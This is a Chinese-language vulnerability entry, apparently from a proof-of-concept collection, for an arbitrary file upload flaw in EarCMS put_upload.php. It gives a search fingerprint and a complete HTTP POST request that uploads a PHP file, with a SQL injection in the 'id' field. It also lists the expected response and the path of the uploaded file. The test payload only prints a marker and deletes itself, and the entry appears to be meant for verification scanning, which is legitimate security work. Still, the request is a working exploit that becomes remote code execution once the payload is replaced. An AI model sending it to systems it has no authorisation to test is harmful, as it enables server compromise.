﻿# EarCMS put_upload.php 任意文件上传漏洞

> 更新时间：2024-04-07

> 漏洞编号：

> 漏洞说明：EarCMS put_upload.php接口处存在任意文件上传漏洞，恶意攻击者可以上传恶意软件，例如后门、木马或勒索软件，以获取对服务器的远程访问权限或者破坏系统，对服务器造成极大的安全隐患。

> 漏洞特征：app="EearCMS"

> 验证脚本：HTTP

```
POST /source/index/put_upload.php HTTP/1.1
Content-Type: multipart/form-data;boundary=---------------------------51564987891651984798165156489

-----------------------------51564987891651984798165156489
Content-Disposition: form-data; name="ipa"; filename="dudesuite"
Content-Type: application/x-msdownload

<?php echo "dudesuite";unlink(__FILE__);?>
-----------------------------51564987891651984798165156489
Content-Disposition: form-data; name="id"

-1  union SELECT "dudesuite.php";
-----------------------------51564987891651984798165156489
Content-Disposition: form-data; name="pw"

month-cf3b79c6e54ca7a8d50cdc8aedcde407
-----------------------------51564987891651984798165156489--
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：/data/attachment/dudesuite.php

> 验证文件来源：EarCMS put_upload.php 任意文件上传漏洞.poc

